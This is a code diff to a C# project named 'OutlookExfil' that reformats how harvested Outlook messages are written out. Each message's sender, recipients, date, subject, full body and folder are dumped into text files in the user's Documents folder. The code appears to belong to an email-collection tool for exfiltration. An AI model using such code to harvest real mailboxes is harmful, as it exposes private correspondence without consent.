@@ -63,7 +63,7 @@ namespace OutlookExfil
                             mailBody = mailItem.Body;
                             break;
                     }
-                    var mailOutput = string.Format("{0},{1},{2},{3},{4},{5}", mailItem.SenderEmailAddress, mailItem.Recipients, mailItem.SentOn.ToString(), mailItem.Subject, mailBody, CurrentFolder.FolderPath);
+                    var mailOutput = string.Format("SEN:{0},REC:{1},SENT:{2},SUBJ:{3},BODY:{4},FOL:{5}", mailItem.SenderEmailAddress, mailItem.Recipients, mailItem.SentOn.ToString(), mailItem.Subject, mailBody, CurrentFolder.FolderPath);
                     string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                     using (StreamWriter outputFile = new StreamWriter(Path.Combine(docPath, outFileName), true))
                     {
@@ -143,7 +143,7 @@ namespace OutlookExfil
                                 mailBody = mailItem.Body;
                                 break;
                         }
-                        var mailOutput = string.Format("{0},{1},{2},{3},{4},{5}", mailItem.SenderEmailAddress, mailItem.Recipients, mailItem.SentOn.ToString(), mailItem.Subject, mailBody, CurrentFolder.FolderPath);
+                        var mailOutput = string.Format("SEN:{0},REC:{1},SENT:{2},SUBJ:{3},BODY:{4},FOL:{5}", mailItem.SenderEmailAddress, mailItem.Recipients, mailItem.SentOn.ToString(), mailItem.Subject, mailBody, CurrentFolder.FolderPath);
                         string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                         using (StreamWriter outputFile = new StreamWriter(Path.Combine(docPath, "EmailsSingleSelect.txt"), true))
                         {
